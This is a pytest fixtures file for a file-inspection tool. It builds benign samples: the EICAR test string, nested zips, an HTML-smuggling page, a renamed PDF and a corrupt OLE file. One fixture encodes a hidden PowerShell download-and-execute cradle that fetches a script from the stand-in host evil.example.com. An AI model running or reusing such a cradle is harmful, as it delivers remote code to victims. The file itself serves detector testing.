"""Benign fixtures for the inspector tests.

Everything here is constructed at test time and is harmless — no live malware
(see CLAUDE.md -> File Analysis). Fixtures that require
image-only tooling (a real .docm macro doc, an AES-encrypted zip) are built in
the WI-1/WI-2 image test job; the pure-logic fixtures below need no external
tools and run anywhere.
"""
from __future__ import annotations

import base64
import os
import sys
import zipfile

import pytest

# Make the inspector modules importable (contract/common/router at package root).
_INSPECTOR_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if _INSPECTOR_DIR not in sys.path:
    sys.path.insert(0, _INSPECTOR_DIR)

EICAR = r"X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"


@pytest.fixture
def tmp_sample(tmp_path):
    """Return a factory that writes bytes/str to a temp file and returns its path."""

    def _make(name: str, data) -> str:
        path = tmp_path / name
        mode = "wb" if isinstance(data, (bytes, bytearray)) else "w"
        with open(path, mode) as fh:
            fh.write(data)
        return str(path)

    return _make


@pytest.fixture
def layered_powershell() -> str:
    """A benign multi-layer -enc PowerShell whose decoded body references a URL."""
    inner = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.com/s2.ps1')"
    enc = base64.b64encode(inner.encode("utf-16-le")).decode()
    return "powershell -nop -w hidden -enc " + enc


@pytest.fixture
def concat_powershell() -> str:
    """Benign string-concatenation obfuscation."""
    return "$a = 'ev'+'il'+'.example'+'.com'; Write-Host $a"


@pytest.fixture
def html_smuggling(tmp_path) -> str:
    """Benign HTML that reassembles a small zip via atob + Blob."""
    payload = base64.b64encode(b"PK\x03\x04benign-not-a-real-zip-body-just-for-detection" * 8).decode()
    html = (
        "<html><body><script>"
        f"var b64='{payload}';"
        "var bytes=atob(b64);"
        "var blob=new Blob([bytes],{type:'application/octet-stream'});"
        "var url=URL.createObjectURL(blob);"
        "</script></body></html>"
    )
    path = tmp_path / "invoice.html"
    path.write_text(html)
    return str(path)


@pytest.fixture
def zip_of_zips(tmp_path) -> str:
    """A benign nested zip (recursion-bound test), innermost holds EICAR."""
    inner = tmp_path / "inner.zip"
    with zipfile.ZipFile(inner, "w") as zf:
        zf.writestr("eicar.com", EICAR)
    outer = tmp_path / "outer.zip"
    with zipfile.ZipFile(outer, "w") as zf:
        zf.write(inner, "inner.zip")
    return str(outer)


@pytest.fixture
def pdf_renamed_docx(tmp_path) -> str:
    """A minimal real PDF given a .docx name (extension-mismatch + magic test)."""
    pdf = b"%PDF-1.7\n1 0 obj<<>>endobj\ntrailer<<>>\n%%EOF\n"
    path = tmp_path / "report.docx"
    path.write_bytes(pdf)
    return str(path)


@pytest.fixture
def corrupt_ole(tmp_path) -> str:
    """OLE magic header followed by garbage — must degrade, not crash."""
    path = tmp_path / "broken.doc"
    path.write_bytes(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + os.urandom(256))
    return str(path)
